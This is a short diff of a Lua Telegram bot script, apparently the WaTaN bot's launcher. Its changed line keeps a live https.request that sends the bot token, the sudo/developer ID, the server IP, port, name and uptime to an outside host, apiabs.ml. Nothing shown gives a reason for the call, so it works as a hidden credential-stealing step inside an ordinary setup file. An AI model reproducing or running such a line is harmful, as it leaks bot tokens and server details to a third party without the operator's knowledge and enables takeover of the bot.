@@ -64,7 +64,7 @@ end
 os.execute('lua WaTaN.lua') 
 end
 end
-https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..DevAbs:get(Server.."IdDevProx").."&TokenBot="..DevAbs:get(Server.."TokenDevProx").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("https://apiabs.ml/Api/WaTaN/index.php?Get=WaTaN&DevId="..database:get(id_server..":SUDO:ID").."&TokenBot="..database:get(id_server..":token").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 local create_config_auto = function()
 config = {
 token = database:get(id_server..":token"),
